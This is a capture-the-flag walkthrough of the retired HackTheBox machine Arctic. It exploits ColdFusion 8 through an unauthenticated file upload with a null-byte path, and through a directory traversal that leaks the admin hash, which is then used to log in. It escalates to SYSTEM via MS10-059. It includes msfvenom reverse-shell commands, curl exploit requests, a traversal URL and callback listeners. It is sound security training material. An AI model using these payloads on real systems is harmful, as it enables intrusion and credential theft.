---
title: HTB: Arctic
url: https://0xdf.gitlab.io/2020/05/19/htb-arctic.html
date: 2020-05-19T14:35:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-arctic, ctf, hackthebox, nmap, coldfusion, javascript, searchsploit, jsp, upload, metasploit, directory-traversal, crackstation, windows-exploit-suggester, ms10-095, oscp-like-v1
---

![Arctic](https://0xdfimages.gitlab.io/img/arctic-cover.png)

Arctic would have been much more interesting if not for the 30-second lag on each HTTP request. Still, there’s enough of an interface for me to find a ColdFusion webserver. There are two different paths to getting a shell, either an unauthenticated file upload, or leaking the login hash, cracking or using it to log in, and then uploading a shell jsp. From there, I’ll use MS10-059 to get a root shell.

## Box Info

| Name | [Arctic](https://hackthebox.com/machines/arctic)  [Arctic](https://hackthebox.com/machines/arctic) [Play on HackTheBox](https://hackthebox.com/machines/arctic) |
| --- | --- |
| Release Date | 22 Mar 2017 |
| Retire Date | 26 May 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Arctic |
| Radar Graph | Radar chart for Arctic |
| First Blood User | 14 days23:57:59[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| First Blood Root | 15 days03:55:12[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found three open TCP ports, RPC (135, 49154) and something on (8500):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmapalltcp 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 06:42 EDT
Nmap scan report for 10.10.10.11
Host is up (0.018s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

```

I typically immediate pivot from that first scan that just looks for open ports on all TCP ports into another `nmap` with the `-sC` and `-sV` flags to run safe scripts and enumerate versions on each of the ports returned from the first run. In this case, that takes a while and returns no additional information:

```

root@kali# nmap -sC -sV -p 135,8500,49154 -oA scans/nmaptcpscripts 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 06:43 EDT
Nmap scan report for 10.10.10.11
Host is up (0.012s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.60 seconds

```

### Website - TCP 8500

#### Protocol Enumeration

I used `nc` to connect to the port and tried to get it to send me any kind of error message:

```

root@kali# nc 10.10.10.11 8500
hi

Ncat: Broken pipe.

```

Some Googling revealed that [ColdFusion](https://www.speedguide.net/port.php?port=8500) webserver runs on TCP 8500, so I tried a GET over `nc`. It hung for like 30 seconds, but then returned:

```

root@kali# nc 10.10.10.11 8500
GET / HTTP

HTTP/1.0 200 OK
Date: Thu, 14 May 2020 18:48:18 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Server: JRun Web Server

<html>
<head>
<title>Index of /</title></head><body bgcolor="#ffffff">
<h1>Index of /</h1><br><hr><pre><a href="CFIDE/">CFIDE/</a>               <i>dir</i>   03/22/17 08:52 μμ
<a href="cfdocs/">cfdocs/</a>              <i>dir</i>   03/22/17 08:55 μμ
</pre><hr></html>

```

#### Site

Just like in `nc`, every request to this server takes about 30 seconds to resolve, which is painful. The web root gives a directory listing:

![image-20200513065111301](https://0xdfimages.gitlab.io/img/image-20200513065111301.png)

`CFIDE` and `cfdocs` both fit the ColdFusion hypothesis.

I’ll open both in new tabs, and start opening more things in new tabs, thiough opening too many at once would cause them all to send back empty responses.

Given the extremely slow server, and the fact the directories seem to be listing, I’m going to hold off on brute forcing for now.

#### /CFIDE/administrator

After spending some time opening tabs and waiting for pages to load, the most interesting thing was `/CFIDE/administrator`, which presented a login page for ColdFusion version 8:

![image-20200513065856857](https://0xdfimages.gitlab.io/img/image-20200513065856857.png)

It doesn’t let me change the username, but I did make a couple guesses at a password like ‘admin’ and ‘arctic’. Neither worked, but there was something odd in the POST request. For example, below is the POST for password ‘admin’:

```

POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Cookie: CFID=100; CFTOKEN=20430451
Upgrade-Insecure-Requests: 1

cfadminPassword=B9BC23617C8434AB7A7E01BC1AA55D774366202E&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1589482492739&submit=Login

```

Looking at the page source, I can see where the HTML `form` element defines what data is submitted:

```

<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >

```

Further down in the form, the `salt` is a hidden value on the page:

```

<input name="requestedURL" type="hidden" value="/CFIDE/administrator/enter.cfm?">
<input name="salt" type="hidden" value="1589483602821">
<input name="submit" type="submit" value="Login" style=" margin:7px 0px 0px 2px;;width:80px">

```

So when I request the login form, the server generates a salt and sends it in the page. Then when I submit, it takes that salt and uses Javascript to SHA1 hash and then HMAC SHA1 hash the result, and submits that.

#### Vulnerabilities

`searchsploit` returns a bunch of stuff for ColdFusion:

```

root@kali# searchsploit coldfusion
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                     | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                  | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                     | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution             | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                           | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                       | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                      | cfm/webapps/36172.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                               | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                  | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                         | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                               | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting            | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site S | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting  | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting   | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                     | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                           | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                  | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                       | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                 | multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                                                   | cfm/remote/21548.txt
ColdFusion MX - Remote Development Service                                                              | windows/remote/50.pl
ColdFusion Scripts Red_Reservations - Database Disclosure                                               | asp/webapps/7440.txt
ColdFusion Server 2.0/3.x/4.x - Administrator Login Password Denial of Service                          | multiple/dos/19996.txt
Macromedia ColdFusion MX 6.0 - Error Message Full Path Disclosure                                       | cfm/webapps/22544.txt
Macromedia ColdFusion MX 6.0 - Oversized Error Message Denial of Service                                | multiple/dos/24013.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                               | multiple/remote/22867.pl
Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting                                   | cfm/webapps/23256.txt
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                   | multiple/remote/24654.txt
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                            |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Top Five ColdFusion Security Issues                                                                     | docs/english/17845-top-five-cold
-------------------------------------------------------------------------------------------------------- ---------------------------------

```

It’s worth taking a few minutes to look at each results. Many I can dismiss because of version mismatch or because I’m not really interested in XSS bugs at this point. That leaves these:

```

Adobe ColdFusion - Directory Traversal                                                                  | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                     | multiple/remote/16985.rb
Adobe ColdFusion 2018 - Arbitrary File Upload                                                           | multiple/webapps/45979.txt
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                               | multiple/remote/24946.rb
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                       | cfm/webapps/16788.rb
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                   | multiple/remote/24654.txt

```

A little more examining of `Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)` suggests it’s for a different version of CF. I’ll also rule out `Adobe ColdFusion 2018 - Arbitrary File Upload`, as it relies on posting to `/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm`, and I can’t find a `cf_scripts` directory on Arctic.

That leaves two vulnerabilities to explore further.

## Shell as tolis

### Generate Payload

With upload to webserver vulnerabilities, typically I would go with a CFM webshell to get a foothold, and then get a shell from there. But this box is so painfully slow, that I want to get away from CF as quickly as possible. JSP payloads typically work on CF, so I’ll create one with `msfvenom`:

```

root@kali# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
Payload size: 1496 bytes

```

### Path 1: Unauthenticated RCE

#### Exploit Analysis

The most direct path to RCE on Arctic is via the Execution vulnerability:

```

ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                       | cfm/webapps/16788.rb

```

Especially for OSCP practice, being able to read a Metasploit script and understand it is a critical still. I’ll open the script with `searchsploit -x cfm/webapps/16788.rb`. The most interesting path is the `exploit` function:

```

def exploit

    page  = rand_text_alpha_upper(rand(10) + 1) + ".jsp"

    dbl = Rex::MIME::Message.new
    dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
    file = dbl.to_s
    file.strip!

    print_status("Sending our POST request...")

    res = send_request_cgi(
        {
            'uri'           => "#{datastore['FCKEDITOR_DIR']}",
            'query'         => "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
            'version'       => '1.1',
            'method'        => 'POST',
            'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,
            'data'          => file,
            }, 5)

    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
        print_status("Upload succeeded! Executing payload...")

        send_request_raw(
            {
                # default path in Adobe ColdFusion 8.0.1.
                'uri'           => '/userfiles/file/' + page,
                'method'        => 'GET',
                }, 5)

        handler
    else
        print_error("Upload Failed...")
        return
    end

end

```

This is a relatively simply exploit - it makes two HTTP requests. First is a POST to `FCKEDITOR_DIR`, which has a default value of `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm` defined earlier in the script. Then it does a GET to `/userfiles/file/` to trigger the payload.

#### Upload Reverse Shell

I can recreate this exploit with `curl`:

```

root@kali# curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
                </script>

```

Once that finishes, there’s a new folder at the root:

![image-20200513094548902](https://0xdfimages.gitlab.io/img/image-20200513094548902.png)

But there’s no file in `/userfiles/file/`. I must have hit some filter. My request looks like:

```

POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00 HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 1700
Content-Type: multipart/form-data; boundary=------------------------2cf8346e8d23a757
Expect: 100-continue
Connection: close
--------------------------2cf8346e8d23a757
Content-Disposition: form-data; name="newfile"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
...[snip]...

```

There’s two things I need to set to get this upload to work, and both are set in the MSF exploit. First, I can’t have the filename end in `jsp`. That will be filtered out. The MSF script uses `.txt`, so I’ll mimic that by making a copy of my payload named `shell.txt`. The MSF script also sets the `Content-Type` on the file to `application/x-java-archive`.

I’ll update the `curl`. I can adjust headers inside the form data by adding it inside the `-F` argument separated by `;`:

```

# curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

```

Now visiting `/userfiles/file/` shows the uploaded shell:

![image-20200513095953434](https://0xdfimages.gitlab.io/img/image-20200513095953434.png)

#### Execute Shell

I can visit that url with `curl`:

```

root@kali# curl 'http://10.10.10.11:8500/userfiles/file/df.jsp'

```

And in another window (about 30 seconds later) I get a shell:

```

root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:50028.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis

```

From there I can grab `user.txt`:

```

C:\Users\tolis\Desktop>type user.txt
02650d3a************************

```

### Path 2: Leak Hash, Upload JSP

#### Directory Traversal / Password Hash Leak

These two results from `searchsploit` show a directory traversal vulnerability:

```

Adobe ColdFusion - Directory Traversal                                                                  | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                     | multiple/remote/16985.rb

```

Examining the Python script, it is issuing a GET to `http://server/CFIDE/administrator/enter.cfm` with a `locale` parameter that goes back up several directories to some file, and then terminates with a `%00en`. Likely the site is making sure the `locale` ends with a reasonable string, and the exploit uses the null byte to pass that check and still get the file.

The file in the example is interesting because it is the `password.properties` file. I’ll grab it by visiting `http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`:

![image-20200513074600371](https://0xdfimages.gitlab.io/img/image-20200513074600371.png)

That password fields looks like a hash, and given the length, it looks like a SHA1: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03.

#### Log In

From here there’s two ways to go. This hash is easily cracked, and in fact is already cracked in [CrackStation](http://crackstation.net):

![image-20200513074833739](https://0xdfimages.gitlab.io/img/image-20200513074833739.png)

I can enter `happyday` into the password field and it successfully logs in.

However, what if the user had picked a really strong password that I couldn’t easily break? I can actually work around that here too.

Remember from above that JavaScript takes the password input (`happyday`), makes a SHA1 hash, and then a keyed HMAC hash of that result, and submits the key (or salt) with the hash to the site. So it makes sense that I can do that locally with the leaked hash (which is also described [here](https://nets.ec/Coldfusion_hacking#Logging_In))

I can go into the Firefox developer tools and use the same functions to get the hash that’s submitted. To reference the salt on the page, I’ll use `document.loginform.salt.value`. Then I’ll give the leaked SHA1:

```

hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03');

```

It gives a result:

![image-20200513081248163](https://0xdfimages.gitlab.io/img/image-20200513081248163.png)

I’ll submit the form, and modify the hash based on the calculations:

```

POST /CFIDE/administrator/enter.cfm HTTP/1.1
Host: 10.10.10.11:8500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.11:8500/CFIDE/administrator/
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Cookie: CFID=100; CFTOKEN=20430451; CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fhomepage%2Ecfm
Upgrade-Insecure-Requests: 1

cfadminPassword=C1F159600F4058D19D25DACA563D723273798E8C&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm%3F&salt=1589487103545&submit=Login

```

It logs in! One thing that is tricky though. If I watch Burp, I’ll see that just sitting on the login screen, the form refreshed every 30 seconds or so, including a new salt. If the salt doesn’t match the current salt on the server, it is rejected, so this all has to be done quickly. That said, it wouldn’t be hard to automate with Python or a TamperMonkey script, to do manually on a more responsive application.

#### Upload Reverse Shell

I’ll follow the steps outlined [here](https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File) to write a shell to Arctic. First navigate to Mappings under Server Settings, and get the path for `CFIDE`, `C:\ColdFusion8\wwwroot\CFIDE`:

![image-20200513082205473](https://0xdfimages.gitlab.io/img/image-20200513082205473.png)

Now back on the main admin page, I’ll go to Debugging & Logging > Scheduled Tasks:

![image-20200513082355981](https://0xdfimages.gitlab.io/img/image-20200513082355981.png)

I’ll clikc Schedule New Task, and provide:
- `Task Name`: Anything I want
- `URL`: URL I control from which to get a CFM shell. Turns out Kali has a CFM webshell in `/usr/share/webshells/cfm`. I started a Python webserver in that directory.
- `Publish`: Check the “Save output to a file” box.
- `File`: The path I got from the mappings tab, plus the name of the shell and `.cfm`.

![image-20200513085543130](https://0xdfimages.gitlab.io/img/image-20200513085543130.png)

On hitting Submit, it shows the task, and I can then click the document with the green circle to run the task now:

![image-20200513083108260](https://0xdfimages.gitlab.io/img/image-20200513083108260.png)

There’s contact at my webserver:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [13/May/2020 08:46:34] "GET /cfexec.cfm HTTP/1.1" 200 -

```

Now if I refresh `http://10.10.10.11:8500/CFIDE/`, I see the shell:

![image-20200513090504605](https://0xdfimages.gitlab.io/img/image-20200513090504605.png)

#### Execute Shell

Clicking on the `.jsp` returns a shell at my `nc` listener:

```

root@kali# rlwrap nc -nvlp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49774.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis

```

I could get `user.txt` here as well.

## Priv: tolis –> system

### Enumeration

I looked around the file system and didn’t see much interesting outside of ColdFusion. Running `systeminfo` shows that this is a Windows 2008 R2 server with no hotfixes applied:

```

C:\>systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          14/5/2020, 9:38:49 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 261 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.199 MB
Virtual Memory: In Use:    848 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

```

### Windows-Exploit-Suggester

Given the complete lack of hotfixes, this is likely vulnerable to an exploit. I can use the `sysinfo` results to run [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). I’ll clone the repo into `/opt`:

```

root@kali:/opt# git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git         
Cloning into 'Windows-Exploit-Suggester'...          
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 6.27 MiB/s, done.
Resolving deltas: 100% (72/72), done. 

```

I’ll also need to install the Python xlrd library with `python -m pip install xlrd`.

First, I’ll create a database:

```

root@kali# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-05-13-mssb.xls                 
[*] done

```

Now I can run that against the `sysinfo` output:

```

root@kali# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

Looking at those, as I’m not as interested in MSF modules to start, and as IE is likely to require user interaction, ones to look into are:
- MS10-047
- MS10-059
- MS10-061
- MS10-073
- MS11-011
- MS13-005

### MS10-059

I did some googling around for exploit code and found [this GitHub from egre55](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri) that included an exploit for MS10-059. I was particularly drawn to the fact that this binary requires an IP and port to connect to. Many of the exploits will start a new cmd as SYSTEM, which is nice if you are standing at the computer, but not so useful from a remote shell.

I downloaded the binary (while it’s never a great idea to run exes downloaded directly from the internet, for a CTF environment, I’m willing to run it), and ran `smbserver.py share .` to share my current directory.

Then in my shell, I copied it to Arctic:

```

C:\ProgramDatap>net use \\10.10.14.47\share
net use \\10.10.14.47\share
The command completed successfully.

C:\ProgramData>copy \\10.10.14.47\share\Chimichurri.exe .
copy \\10.10.14.47\share\Chimichurri.exe .
        1 file(s) copied.

```

Now I start a `nc` listener, and run it:

```

C:\ProgramData>.\Chimichurri.exe 10.10.14.47 443
.\Chimichurri.exe 10.10.14.47 443
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>

```

I get a shell:

```

root@kali# rlwrap nc -nvlp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:50381.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ProgramData>whoami
nt authority\system

```

From here I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
ce65ceee************************

```